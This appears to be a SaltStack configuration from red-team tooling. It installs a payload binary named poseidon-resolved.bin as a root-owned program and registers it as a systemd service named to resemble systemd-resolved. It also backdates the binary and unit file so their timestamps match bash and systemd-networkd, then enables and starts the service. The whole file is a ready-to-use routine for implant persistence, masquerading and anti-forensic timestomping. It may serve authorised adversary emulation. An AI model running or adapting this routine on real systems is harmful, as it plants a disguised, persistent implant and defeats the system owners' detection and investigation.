resolved-service-binary:
  file.managed:
    - source: salt://redteam/linux/payloads/poseidon-resolved.bin
    - name: /usr/bin/resolved-syncd
    - mode: '0755'
    - user: root
    - group: root

resolved-service-file:
  file.managed:
    - source: salt://redteam/linux/services/systemd-resolved-syncd.service
    - name: /lib/systemd/system/systemd-resolved-syncd.service
    - mode: '0644'
    - user: root
    - group: root

resolved-time-stomp-binary:
  cmd.run:
    - name: touch --reference=/usr/bin/bash /usr/bin/resolved-syncd

resolved-time-stomp-service:
  cmd.run:
    - name: touch --reference=/lib/systemd/system/systemd-networkd.service /lib/systemd/system/systemd-resolved-syncd.service 

resolved-reload-daemon:
  cmd.run:
    - name: sudo systemctl daemon-reload

enable-resolved-service:
  cmd.run:
    - name: sudo systemctl enable systemd-resolved-syncd.service

resolved-service:
  cmd.run:
    - name: sudo systemctl restart systemd-resolved-syncd.service

verify-resolved-service:
  service.running:
    - name: systemd-resolved-syncd
    - reload: true
    - enable: true
